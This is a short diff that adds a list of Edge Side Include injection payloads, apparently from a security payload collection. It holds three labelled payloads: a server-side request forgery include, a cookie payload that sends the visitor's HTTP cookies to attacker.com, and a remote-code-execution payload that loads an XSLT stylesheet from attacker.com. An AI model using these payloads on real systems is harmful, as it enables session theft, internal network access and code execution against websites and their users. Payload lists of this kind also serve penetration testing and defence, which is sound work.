@@ -1,0 +1,8 @@
+# ------ SSRF payload:
+<esi:include src="http://example.com/1.html" alt="http://bak.example.com/2.html" onerror="continue"/>
+
+# ------ Cookie payload:
+<esi:include src=http:/>/attacker.com/$(HTTP_COOKIE)>
+
+# ------ RCE through XSLT:
+<esi:include src="http://attacker.com/file.xml" dca="xslt" stylesheet="http://attacker.com/transformation.xsl">
